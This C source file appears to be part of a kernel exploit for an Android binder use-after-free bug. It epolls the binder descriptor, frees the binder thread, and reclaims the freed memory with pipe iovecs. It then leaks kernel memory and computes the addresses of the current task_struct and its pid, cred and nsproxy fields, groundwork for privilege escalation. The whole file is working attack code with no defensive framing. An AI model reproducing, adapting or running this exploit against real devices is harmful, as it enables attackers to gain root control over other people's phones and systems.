#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include "../include/binder_uaf.h"
#include "../include/event_poll.h"
#include "../include/log.h"

void binder_uaf_leak_task_struct(int binder_fd,
                                 struct task_struct **leak_task_struct,
                                 void **leak_pid_address,
                                 void **leak_cred_address,
                                 void **leak_nsproxy_address,
                                 void **mapped_memory) {

  int pipe_fd[2] = {0};
  ssize_t nBytesRead = 0;
  static char dataBuffer[PAGE_SIZE] = {0};
  struct iovec iovecStack[IOVEC_COUNT];
  struct epoll_event epoll_event_t = {.events = EPOLLIN};

  int epfd = event_pool_create();

  if (epfd < 0) {
    exit(EXIT_FAILURE);
  }

  int pipe_res = pipe(pipe_fd);

  if (pipe_res < 0) {
    ERROR("Unable to create pipe: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }

  SUCCESS("Pipes Created");

  int fcntl_res = fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE);

  if (fcntl_res < 0) {
    ERROR("Failed to change pipe size: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }

  SUCCESS("Changed pipe capacity to : 0x%x", PAGE_SIZE);

  *mapped_memory =
      mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (*mapped_memory == MAP_FAILED) {
    ERROR("Failed to map 4gb aligned page");
    exit(EXIT_FAILURE);
  }
  SUCCESS("Mapped page: %p", *mapped_memory);

  INFO("Setting up iovecs");

  memset(iovecStack, 0, sizeof(iovecStack));

  iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
  iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE;

  iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
      (void *)((char *)(*mapped_memory) + PAGE_SIZE);
  iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE;

  event_pool_add(epfd, binder_fd, &epoll_event_t);

  pid_t childPid = fork();

  if (childPid == 0) {
    sleep(2);

    event_pool_remove(epfd, binder_fd, &epoll_event_t);

    nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));

    if (nBytesRead != PAGE_SIZE) {
      ERROR("Read failed: %s", strerror(errno));
      exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
  } else if (childPid > 0) {
    binder_thread_exit(binder_fd);

    ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT);

    if (nBytesWritten != PAGE_SIZE * 2) {
      ERROR("Writev failed. nBytesWritten: 0x%lx, expected: 0x%x\n %s",
            nBytesWritten, PAGE_SIZE * 2, strerror(errno));
      close(pipe_fd[0]);
      close(pipe_fd[1]);
      kill(childPid, SIGKILL);
      wait(NULL);
      exit(EXIT_FAILURE);
    }

    INFO("Wrote 0x%lx bytes", nBytesWritten);

    nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));

    if (nBytesRead != PAGE_SIZE) {
      ERROR("Read failed: %s", strerror(errno));
      close(pipe_fd[0]);
      close(pipe_fd[1]);
      kill(childPid, SIGKILL);
      wait(NULL);
      exit(EXIT_FAILURE);
    }

    wait(NULL);

    close(pipe_fd[0]);
    close(pipe_fd[1]);

    *leak_task_struct = (struct task_struct *)*(
        (int64_t *)(dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA));
    *leak_pid_address = (void *)((int8_t *)(*leak_task_struct) +
                                 offsetof(struct task_struct, pid));
    *leak_cred_address = (void *)((int8_t *)(*leak_task_struct) +
                                  offsetof(struct task_struct, cred));
    *leak_nsproxy_address = (void *)((int8_t *)(*leak_task_struct) +
                                     offsetof(struct task_struct, nsproxy));

    INFO("Leaked task_struct: %p", *leak_task_struct);
    INFO("task_struct->pid: %p", *leak_pid_address);
    INFO("task_struct->cred: %p", *leak_cred_address);
    INFO("task_struct->nsproxy: %p", *leak_nsproxy_address);
  } else {
    ERROR("Fork failed: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
}